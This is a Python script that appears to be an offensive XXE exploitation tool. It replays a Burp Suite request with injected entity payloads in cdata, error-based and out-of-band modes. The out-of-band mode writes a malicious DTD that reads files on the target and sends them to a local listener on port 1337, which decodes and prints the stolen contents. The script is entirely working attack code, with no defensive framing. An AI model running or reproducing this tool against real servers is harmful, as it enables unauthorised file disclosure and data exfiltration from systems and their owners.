#!/usr/bin/env python3


from sys import argv
from requests import request
from base64 import b64decode
import readline
import argparse
from os import system, popen
from http.server import SimpleHTTPRequestHandler
import socketserver
from threading import Thread

fpay = []
class request_handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','application/xml')
        self.end_headers()
        if self.path:
            payload = str(fpay[-1]).replace("\n", "")
            self.wfile.write(payload.encode())
            try:
                result = str(str(self.path).split("=")[-1])
                result = str(b64decode(result).decode('ascii')).replace("\\n", "\n")
                print(result)
            except:
                pass

def start_server():
    handler_object = request_handler
    PORT = 1337
    print(f"Server listening ar {PORT}")
    socketserver.TCPServer.allow_reuse_address = True
    my_server = socketserver.TCPServer(("", PORT), request_handler)
    my_server.serve_forever()

def server_threading():
    try:
        
        thread = Thread(target=start_server)
        thread.daemon = True
        thread.start()
    except KeyboardInterrupt:
        Thread.set()
        httpd.shutdown() 

def get_args():
    parser = argparse.ArgumentParser()
    requiredArg = parser.add_argument_group('required arguments:')
    requiredArg.add_argument("-f", "--request-file", dest="request_file", metavar="", required=True, help="Request file form BurpSuite")
    requiredArg.add_argument("-m", "--xxe-mode", dest="xxe_mode", metavar="", required=True, help="XXE exploitation mode")
    parser.add_argument("-x", "--proxy", metavar="", help="http://<ip>:<port>")
    args = parser.parse_args()
    request_file = args.request_file
    xxe_mode = args.xxe_mode
    proxy = args.proxy
    if proxy is None:
        proxies = None
        parse_file(proxies, request_file, xxe_mode)
    else:
        proxies = {"http": f"{proxy}"}
        parse_file(proxies, request_file, xxe_mode)

def parse_file(proxies, request_file, xxe_mode):
    f = open(request_file, "r")
    file = str(f.read()).split("\n\n")
    method = str(file[0]).split()[0]
    path = str(file[0]).split()[1]
    target = f"http://{str(file[0]).split()[4]}"
    header = file[0].split("\n")
    body = file[1]
    for _ in header:
        if "Content-Type" in _:
            header, value = _.split(": ")
        try:
            if "Cookie" in _:
                cookie_header, cookie_value = _.split(": ")
        except:
            pass
    
    headers = {header: value, cookie_header: cookie_value}
    #print(headers)

    if xxe_mode == "cdata":
        create_file = system("echo '<!ENTITY joined \"%begin;%file;%end;\">' > cdata.dtd")
        try:
            payload = ""
            while payload != "quit":
                payload = str(input("> "))
                if payload != quit:
                    bbody = body.replace("PAYLOAD", payload)
                    r = request(method, target+path, headers=headers, data=bbody, proxies=proxies, verify=False)
                    for data in r.text.split(" "):
                        print(data)
        except KeyboardInterrupt:
            print("bye!")
    elif xxe_mode == "error":
        try:
            payload = ""
            while payload != "quit":
                payload = str(input("> "))
                if payload != "quit":
                    string = "<!ENTITY % file SYSTEM \"PAYLOAD\">"
                    forge = string.replace("PAYLOAD", payload)
                    f = open("error.dtd", "w")
                    f.write(forge + "\n")
                    f.write("<!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>\">")
                    f.close()
        except KeyboardInterrupt:
            print("bye!")
    elif xxe_mode == "oob":
        try:
            ip = str(popen("hostname -I").read()).split(" ")[2]
            payload = ""
            while payload != "quit":
                payload = str(input("> "))
                string = "<!ENTITY % file SYSTEM \"PAYLOAD\">"
                address = "<!ENTITY % oob \"<!ENTITY content SYSTEM 'http://IP:1337/?content=%file;'>\">"
                fetch_file = string.replace("PAYLOAD", payload)
                set_addr = address.replace("IP", ip)
                f = open("blind.dtd", "w")
                f.write(fetch_file +  "\n")
                f.write(set_addr)
                f.close()
                finalp = f"{fetch_file} \n{set_addr}"
                fpay.append(finalp)
                r = request(method, target+path, headers=headers, data=body, proxies=proxies, verify=False)
        except KeyboardInterrupt:
            print("bye!")


server_threading()
get_args()
